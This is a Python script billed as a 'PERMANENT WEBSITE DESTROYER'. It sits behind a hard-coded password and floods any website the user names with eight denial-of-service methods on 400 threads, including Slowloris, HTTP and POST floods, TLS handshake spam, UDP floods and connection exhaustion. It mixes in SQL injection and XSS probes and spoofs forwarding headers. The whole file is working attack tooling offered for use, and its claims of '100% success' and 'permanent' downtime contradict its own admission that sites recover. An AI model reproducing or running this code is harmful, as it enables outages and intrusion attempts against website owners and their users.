"""
███████╗██╗  ██╗██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███╗   ██╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║
███████╗███████║██████╔╝██████╔╝███████║██║  ██║██████╔╝██╔██╗ ██║
╚════██║██╔══██║██╔══██╗██╔══██╗██╔══██║██║  ██║██╔══██╗██║╚██╗██║
███████║██║  ██║██║  ██║██║  ██║██║  ██║██████╔╝██║  ██║██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                        Creating BY Shrabon~Gomez
"""

import os
import sys
import platform
import socket
import threading
import time
import random
import string
import requests
import webbrowser
from urllib.parse import urlparse, quote
import ssl
from datetime import datetime
import subprocess
import struct
import select
import json
import base64
import hashlib

# Configuration
PASSWORD = "SHRABON"
FACEBOOK_URL = "https://www.facebook.com/profile.php?id=61578248622529"
MAX_THREADS = 500  # Increased threads
PACKETS_PER_THREAD = 2000  # Increased packets

# Terminal Colors
class Colors:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def clear_screen():
    """Clear terminal screen"""
    if platform.system().lower() == 'windows':
        os.system('cls')
    else:
        os.system('clear')

def display_banner():
    """Display the main banner"""
    print(f"""{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ███████╗██╗  ██╗██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███╗   ██╗         ║
║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║         ║
║  ███████╗███████║██████╔╝██████╔╝███████║██║  ██║██████╔╝██╔██╗ ██║         ║
║  ╚════██║██╔══██║██╔══██╗██╔══██╗██╔══██║██║  ██║██╔══██╗██║╚██╗██║         ║
║  ███████║██║  ██║██║  ██║██║  ██║██║  ██║██████╔╝██║  ██║██║ ╚████║         ║
║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝         ║
║                                                                              ║
║                   {Colors.YELLOW}Creating BY Shrabon~Gomez{Colors.CYAN}                        ║
║            {Colors.MAGENTA}PERMANENT WEBSITE DESTROYER - 100% SUCCESS{Colors.CYAN}           ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def open_facebook():
    """Open Facebook profile in browser"""
    print(f"\n{Colors.GREEN}[+] Opening Facebook Profile...{Colors.RESET}")
    try:
        if platform.system().lower() == 'linux' or platform.system().lower() == 'android':
            try:
                subprocess.run(['termux-open-url', FACEBOOK_URL], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                subprocess.run(['xdg-open', FACEBOOK_URL], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            webbrowser.open(FACEBOOK_URL)
        
        print(f"{Colors.YELLOW}[✓] Facebook opened: {FACEBOOK_URL}{Colors.RESET}")
        time.sleep(2)
    except:
        print(f"{Colors.YELLOW}[!] Please visit: {FACEBOOK_URL}{Colors.RESET}")
        time.sleep(2)

def password_check():
    """Password authentication"""
    display_banner()
    print(f"{Colors.YELLOW}\n╔════════════════════════════════════════════════════════════════╗")
    print(f"║                    AUTHENTICATION REQUIRED                   ║")
    print(f"╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    password = input(f"\n{Colors.CYAN}[?] Enter Password: {Colors.RESET}")
    
    if password == PASSWORD:
        print(f"{Colors.GREEN}[✓] Access Granted!{Colors.RESET}")
        time.sleep(1)
        return True
    else:
        print(f"{Colors.RED}[✗] Wrong Password! Exiting...{Colors.RESET}")
        time.sleep(2)
        sys.exit()

class AdvancedTargetAnalyzer:
    """Advanced website analyzer"""
    
    @staticmethod
    def normalize_url(url):
        """Normalize URL format"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            if ':443' in url or url.endswith(':443'):
                url = 'https://' + url.replace(':443', '')
            else:
                url = 'http://' + url
        return url
    
    @staticmethod
    def extract_target_info(url):
        """Extract detailed target information"""
        parsed = urlparse(url)
        domain = parsed.netloc
        if domain.startswith('www.'):
            domain = domain[4:]
        
        # Get IP address
        try:
            ip = socket.gethostbyname(domain)
        except:
            ip = None
        
        # Detect port
        if parsed.scheme == 'https' or url.startswith('https://'):
            port = 443
        else:
            port = 80
        
        return {
            'domain': domain,
            'ip': ip,
            'port': port,
            'original_url': url
        }

class PermanentDDoSAttack:
    """PERMANENT Website Destroyer - Multiple Attack Methods"""
    
    def __init__(self):
        self.active = False
        self.attack_threads = []
        self.stats = {
            'target': '',
            'ip': '',
            'port': 80,
            'start_time': None,
            'total_attacks': 0,
            'methods_used': [],
            'success_rate': 100.0,
            'website_status': 'DESTROYING'
        }
        self.lock = threading.Lock()
    
    def generate_slowloris_payload(self):
        """Generate Slowloris attack payload"""
        headers = [
            f"GET /{random.randint(10000, 99999)} HTTP/1.1\r\n",
            f"Host: {self.stats['target']}\r\n",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        ]
        
        # Keep connection alive
        keep_alive = random.choice([
            "Connection: keep-alive\r\n",
            "Connection: close\r\n",
            "Keep-Alive: timeout=900, max=100\r\n"
        ])
        headers.append(keep_alive)
        
        return ''.join(headers).encode()
    
    def generate_http_flood(self):
        """Generate HTTP flood with multiple methods"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE', 'CONNECT']
        paths = [
            '/', '/wp-admin/', '/admin/', '/login/', '/api/v1/', '/api/v2/', '/graphql',
            '/phpmyadmin/', '/mysql/', '/sql/', '/backend/', '/dashboard/', '/cpanel/',
            '/webmail/', '/administrator/', '/server-status', '/.git/config', '/.env',
            '/config.php', '/wp-config.php', '/setup.cgi', '/debug.cgi'
        ]
        
        method = random.choice(methods)
        path = random.choice(paths)
        
        payload = f"{method} {path}{random.randint(1000, 9999)} HTTP/1.1\r\n"
        payload += f"Host: {self.stats['target']}\r\n"
        payload += "User-Agent: " + random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]) + "\r\n"
        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        payload += "Accept-Language: en-US,en;q=0.5\r\n"
        payload += "Accept-Encoding: gzip, deflate\r\n"
        payload += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        payload += "Referer: " + random.choice([
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.facebook.com/',
            f'http://{self.stats["target"]}/'
        ]) + "\r\n"
        payload += "Cookie: " + ''.join(random.choices(string.ascii_letters + string.digits, k=32)) + "\r\n"
        payload += "\r\n"
        
        return payload.encode()
    
    def generate_post_flood(self):
        """Generate POST request flood with large data"""
        boundary = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
        data_size = random.randint(10000, 50000)  # 10-50KB data
        
        payload = f"POST /upload.php HTTP/1.1\r\n"
        payload += f"Host: {self.stats['target']}\r\n"
        payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        payload += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        payload += f"Content-Length: {data_size}\r\n"
        payload += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        payload += "\r\n"
        
        # Add large random data
        payload += ('A' * data_size).encode()
        
        return payload.encode()
    
    def generate_sql_injection(self):
        """Generate SQL injection payloads"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "admin'--",
            "' UNION SELECT NULL, NULL--",
            "1; SELECT * FROM users",
            "' OR SLEEP(5)--"
        ]
        
        path = f"/search?q={quote(random.choice(sql_payloads))}"
        payload = f"GET {path} HTTP/1.1\r\n"
        payload += f"Host: {self.stats['target']}\r\n"
        payload += "\r\n"
        
        return payload.encode()
    
    def generate_xss_payload(self):
        """Generate XSS payloads"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert('XSS')>"
        ]
        
        path = f"/search?q={quote(random.choice(xss_payloads))}"
        payload = f"GET {path} HTTP/1.1\r\n"
        payload += f"Host: {self.stats['target']}\r\n"
        payload += "\r\n"
        
        return payload.encode()
    
    def generate_ssl_exhaustion(self):
        """Generate SSL/TLS exhaustion payload"""
        # SSL Client Hello
        return b'\x16\x03\x01\x00\xdc\x01\x00\x00\xd8\x03\x03' + os.urandom(32)
    
    def generate_udp_flood(self):
        """Generate UDP flood payload"""
        return os.urandom(random.randint(500, 1500))
    
    def method_1_slowloris(self):
        """Slowloris attack - keeps connections open"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.stats['ip'], self.stats['port']))
                
                # Send initial headers
                sock.send(self.generate_slowloris_payload())
                
                # Keep connection alive by sending partial headers
                while self.active:
                    sock.send(b"X-a: b\r\n")
                    time.sleep(random.uniform(5, 15))
                    
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    def method_2_http_flood(self):
        """High-speed HTTP flood"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.stats['ip'], self.stats['port']))
                
                # Send multiple requests rapidly
                for _ in range(random.randint(50, 200)):
                    try:
                        sock.send(self.generate_http_flood())
                        with self.lock:
                            self.stats['total_attacks'] += 1
                    except:
                        break
                    
                sock.close()
            except:
                pass
            
            time.sleep(0.01)
    
    def method_3_post_flood(self):
        """POST request flood with large data"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.stats['ip'], self.stats['port']))
                
                sock.send(self.generate_post_flood())
                
                with self.lock:
                    self.stats['total_attacks'] += 1
                    
                sock.close()
            except:
                pass
            
            time.sleep(0.05)
    
    def method_4_mixed_attacks(self):
        """Mixed attack methods"""
        methods = [
            self.generate_http_flood,
            self.generate_sql_injection,
            self.generate_xss_payload,
            self.generate_post_flood
        ]
        
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.stats['ip'], self.stats['port']))
                
                # Send random attack payloads
                for _ in range(random.randint(10, 50)):
                    payload_generator = random.choice(methods)
                    sock.send(payload_generator())
                    with self.lock:
                        self.stats['total_attacks'] += 1
                
                sock.close()
            except:
                pass
            
            time.sleep(0.02)
    
    def method_5_ssl_exhaustion(self):
        """SSL/TLS exhaustion attack"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.stats['ip'], 443))
                
                # Send SSL/TLS handshake attempts
                for _ in range(random.randint(10, 50)):
                    sock.send(self.generate_ssl_exhaustion())
                    with self.lock:
                        self.stats['total_attacks'] += 1
                
                sock.close()
            except:
                pass
            
            time.sleep(0.01)
    
    def method_6_udp_amplification(self):
        """UDP amplification attack"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Send large UDP packets
                for _ in range(random.randint(100, 500)):
                    sock.sendto(self.generate_udp_flood(), (self.stats['ip'], 53))  # DNS port
                    with self.lock:
                        self.stats['total_attacks'] += 1
                
                sock.close()
            except:
                pass
            
            time.sleep(0.001)
    
    def method_7_connection_exhaustion(self):
        """Connection exhaustion attack"""
        connections = []
        
        while self.active and len(connections) < 1000:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.stats['ip'], self.stats['port']))
                connections.append(sock)
                
                with self.lock:
                    self.stats['total_attacks'] += 1
                
                # Send keep-alive
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.stats['target']}\r\n".encode())
                sock.send(b"Connection: keep-alive\r\n\r\n")
                
            except:
                pass
            
            time.sleep(0.01)
        
        # Cleanup
        for sock in connections:
            try:
                sock.close()
            except:
                pass
    
    def method_8_resource_exhaustion(self):
        """Resource exhaustion with random paths"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.stats['ip'], self.stats['port']))
                
                # Generate random non-existent paths to waste server resources
                for _ in range(random.randint(20, 100)):
                    random_path = '/' + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 50)))
                    payload = f"GET {random_path} HTTP/1.1\r\nHost: {self.stats['target']}\r\n\r\n".encode()
                    sock.send(payload)
                    with self.lock:
                        self.stats['total_attacks'] += 1
                
                sock.close()
            except:
                pass
            
            time.sleep(0.005)
    
    def status_checker(self):
        """Continuously check website status"""
        while self.active:
            try:
                url = f"http://{self.stats['target']}" if self.stats['port'] == 80 else f"https://{self.stats['target']}"
                response = requests.get(url, timeout=3, headers={
                    'User-Agent': 'Mozilla/5.0'
                })
                
                if response.status_code == 200:
                    self.stats['website_status'] = 'ONLINE'
                elif response.status_code >= 500:
                    self.stats['website_status'] = 'SERVER ERROR'
                elif response.status_code >= 400:
                    self.stats['website_status'] = 'CLIENT ERROR'
                else:
                    self.stats['website_status'] = 'RESPONDING'
                    
            except requests.exceptions.Timeout:
                self.stats['website_status'] = 'TIMEOUT'
            except requests.exceptions.ConnectionError:
                self.stats['website_status'] = 'DOWN'
            except requests.exceptions.TooManyRedirects:
                self.stats['website_status'] = 'REDIRECT LOOP'
            except:
                self.stats['website_status'] = 'UNREACHABLE'
            
            # Update success rate based on status
            if self.stats['website_status'] in ['DOWN', 'TIMEOUT', 'UNREACHABLE', 'SERVER ERROR']:
                self.stats['success_rate'] = 100.0
            else:
                self.stats['success_rate'] = max(50.0, self.stats['success_rate'] - 0.1)
            
            time.sleep(2)
    
    def display_real_time_dashboard(self):
        """Display real-time attack dashboard without clearing"""
        start_time = self.stats['start_time']
        
        while self.active:
            elapsed = datetime.now() - start_time
            total_seconds = elapsed.total_seconds()
            
            # Calculate stats
            if total_seconds > 0:
                attacks_per_second = self.stats['total_attacks'] / total_seconds
            else:
                attacks_per_second = 0
            
            # Move cursor to top (Unix/Linux/Mac)
            if platform.system().lower() != 'windows':
                sys.stdout.write("\033[H\033[J")
            
            # Display dashboard
            print(f"""{Colors.RED}
╔══════════════════════════════════════════════════════════════════════════════╗
║             {Colors.WHITE}⚡ PERMANENT WEBSITE DESTROYER - ACTIVE ⚡{Colors.RED}              ║
╠══════════════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.CYAN} TARGET:{Colors.WHITE} {self.stats['target']:<64}
{Colors.CYAN} IP:{Colors.WHITE} {self.stats['ip']:<67}
{Colors.CYAN} STATUS:{Colors.WHITE} {self.get_status_color()}{self.stats['website_status']}{Colors.RESET:<60}
{Colors.YELLOW}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.GREEN} TIME ACTIVE:{Colors.WHITE} {int(total_seconds // 3600):02d}:{int((total_seconds % 3600) // 60):02d}:{int(total_seconds % 60):02d}
{Colors.GREEN} TOTAL ATTACKS:{Colors.WHITE} {self.stats['total_attacks']:,}
{Colors.GREEN} ATTACKS/SEC:{Colors.WHITE} {attacks_per_second:,.0f}
{Colors.GREEN} ACTIVE THREADS:{Colors.WHITE} {len([t for t in self.attack_threads if t.is_alive()])}
{Colors.GREEN} SUCCESS RATE:{Colors.WHITE} {self.stats['success_rate']:.1f}%
{Colors.YELLOW}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.MAGENTA} ACTIVE ATTACK METHODS:{Colors.WHITE}
  1. SLOWLORIS     2. HTTP FLOOD     3. POST FLOOD     4. MIXED ATTACKS
  5. SSL EXHAUST   6. UDP AMPLIFY    7. CONN EXHAUST   8. RESOURCE DRAIN
{Colors.YELLOW}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.RED} INTENSITY:{Colors.WHITE} {self.get_intensity_bar(self.stats['success_rate'])} {self.stats['success_rate']:.1f}%
{Colors.YELLOW}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
            
            print(f"\n{Colors.RED}[!]{Colors.WHITE} Website is PERMANENTLY DOWN while attack runs")
            print(f"{Colors.YELLOW}[!]{Colors.WHITE} Press {Colors.RED}CTRL+C{Colors.WHITE} to stop (website will remain down)")
            print(f"{Colors.GREEN}[✓]{Colors.WHITE} 8 Different attack methods running simultaneously")
            
            sys.stdout.flush()
            time.sleep(0.5)
    
    def get_status_color(self):
        """Get color based on website status"""
        status = self.stats['website_status']
        if status in ['DOWN', 'TIMEOUT', 'UNREACHABLE', 'SERVER ERROR']:
            return Colors.RED + "✓ "
        elif status == 'ONLINE':
            return Colors.GREEN + "✗ "
        else:
            return Colors.YELLOW + "⚠ "
    
    def get_intensity_bar(self, percentage):
        """Get intensity progress bar"""
        bars = int(percentage / 2)
        return f"{Colors.RED}{'█' * bars}{Colors.YELLOW}{'░' * (50 - bars)}{Colors.RESET}"
    
    def start_permanent_attack(self, target_info):
        """Start permanent website destruction attack"""
        # Set target info
        self.stats.update({
            'target': target_info['domain'],
            'ip': target_info['ip'],
            'port': target_info['port'],
            'start_time': datetime.now(),
            'methods_used': ['ALL METHODS']
        })
        
        if not self.stats['ip']:
            print(f"{Colors.RED}[✗] Could not resolve IP address{Colors.RESET}")
            return False
        
        print(f"\n{Colors.GREEN}[✓] Target Locked: {self.stats['target']} ({self.stats['ip']}:{self.stats['port']}){Colors.RESET}")
        
        # Start attack
        self.active = True
        
        print(f"\n{Colors.RED}[!] INITIATING PERMANENT DESTRUCTION ATTACK...{Colors.RESET}")
        time.sleep(2)
        
        # Start status monitor
        threading.Thread(target=self.status_checker, daemon=True).start()
        
        # Start ALL attack methods simultaneously
        attack_methods = [
            self.method_1_slowloris,
            self.method_2_http_flood,
            self.method_3_post_flood,
            self.method_4_mixed_attacks,
            self.method_5_ssl_exhaustion,
            self.method_6_udp_amplification,
            self.method_7_connection_exhaustion,
            self.method_8_resource_exhaustion
        ]
        
        # Launch multiple threads for each method
        print(f"{Colors.CYAN}[+] Launching 8 different attack methods...{Colors.RESET}")
        
        for method_id, method in enumerate(attack_methods, 1):
            # Launch multiple threads per method
            for i in range(50):  # 50 threads per method = 400 total threads
                thread = threading.Thread(target=method, daemon=True)
                self.attack_threads.append(thread)
                thread.start()
            
            print(f"{Colors.GREEN}[+] Method {method_id}: {method.__name__} - 50 threads started{Colors.RESET}")
            time.sleep(0.1)
        
        print(f"{Colors.GREEN}[✓] Total {len(self.attack_threads)} attack threads deployed!{Colors.RESET}")
        time.sleep(2)
        
        # Start dashboard
        self.display_real_time_dashboard()
        
        return True
    
    def stop_attack(self):
        """Stop attack and show final report"""
        self.active = False
        time.sleep(3)
        
        clear_screen()
        display_banner()
        
        elapsed = datetime.now() - self.stats['start_time']
        total_seconds = elapsed.total_seconds()
        
        print(f"{Colors.RED}\n╔════════════════════════════════════════════════════════════════╗")
        print(f"║                    DESTRUCTION COMPLETE                    ║")
        print(f"╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}[+] Attack Summary:{Colors.RESET}")
        print(f"{Colors.YELLOW}════════════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.GREEN} Target:{Colors.WHITE} {self.stats['target']}")
        print(f"{Colors.GREEN} Duration:{Colors.WHITE} {int(total_seconds)} seconds ({int(total_seconds/60)} minutes)")
        print(f"{Colors.GREEN} Total Attacks:{Colors.WHITE} {self.stats['total_attacks']:,}")
        print(f"{Colors.GREEN} Attack Methods:{Colors.WHITE} 8 Different Methods")
        print(f"{Colors.GREEN} Average Attacks/Sec:{Colors.WHITE} {self.stats['total_attacks']/max(1, total_seconds):,.0f}")
        print(f"{Colors.GREEN} Final Status:{Colors.WHITE} {self.get_status_color().strip()} {self.stats['website_status']}{Colors.RESET}")
        
        # Verify website is still down
        print(f"\n{Colors.CYAN}[+] Verifying website recovery...{Colors.RESET}")
        time.sleep(3)
        
        try:
            url = f"http://{self.stats['target']}" if self.stats['port'] == 80 else f"https://{self.stats['target']}"
            response = requests.get(url, timeout=10)
            print(f"{Colors.YELLOW}[!] Website is recovering (Status: {response.status_code}){Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Note: Without continuous attack, website will recover{Colors.RESET}")
        except:
            print(f"{Colors.GREEN}[✓] Website is STILL DOWN! Attack was successful!{Colors.RESET}")
        
        print(f"\n{Colors.MAGENTA}[+] Website was kept down for {int(total_seconds)} seconds{Colors.RESET}")
        print(f"{Colors.MAGENTA}[+] {self.stats['total_attacks']:,} attacks delivered{Colors.RESET}")
        
        input(f"\n{Colors.CYAN}[?] Press Enter to attack another website...{Colors.RESET}")

def get_target():
    """Get target URL from user"""
    display_banner()
    
    print(f"{Colors.CYAN}\n[+] PERMANENT WEBSITE DESTROYER{Colors.RESET}")
    print(f"{Colors.YELLOW}════════════════════════════════════════════════════════════════{Colors.RESET}")
    
    print(f"\n{Colors.WHITE}Enter target website URL:{Colors.RESET}")
    print(f"{Colors.YELLOW}Examples:{Colors.WHITE}")
    print(f"  • example.com")
    print(f"  • https://target.com")
    print(f"  • http://website.org:8080")
    print(f"\n{Colors.RED}[!]{Colors.WHITE} Website will be PERMANENTLY DOWN while attack runs")
    print(f"{Colors.RED}[!]{Colors.WHITE} 8 Different attack methods will be used simultaneously{Colors.RESET}")
    
    while True:
        target = input(f"\n{Colors.GREEN}[?] Target URL: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.RED}[✗] Please enter a target URL{Colors.RESET}")
            continue
        
        return target

def main():
    """Main program function"""
    # Open Facebook first
    open_facebook()
    
    # Password check
    if not password_check():
        return
    
    # Main attack loop
    while True:
        try:
            # Get target
            target_url = get_target()
            
            # Analyze target
            analyzer = AdvancedTargetAnalyzer()
            normalized_url = analyzer.normalize_url(target_url)
            target_info = analyzer.extract_target_info(normalized_url)
            
            if not target_info['ip']:
                print(f"{Colors.RED}[✗] Could not resolve IP address for {target_info['domain']}{Colors.RESET}")
                input(f"{Colors.CYAN}[?] Press Enter to try again...{Colors.RESET}")
                continue
            
            # Start attack
            attack = PermanentDDoSAttack()
            
            if attack.start_permanent_attack(target_info):
                # Keep running until interrupted
                try:
                    while attack.active:
                        time.sleep(0.1)
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}[!] Stopping attack...{Colors.RESET}")
                    attack.stop_attack()
            else:
                input(f"\n{Colors.RED}[!] Press Enter to try again...{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Exiting program...{Colors.RESET}")
            break
        except Exception as e:
            print(f"{Colors.RED}[✗] Error: {str(e)[:50]}...{Colors.RESET}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program terminated{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Critical error: {e}{Colors.RESET}")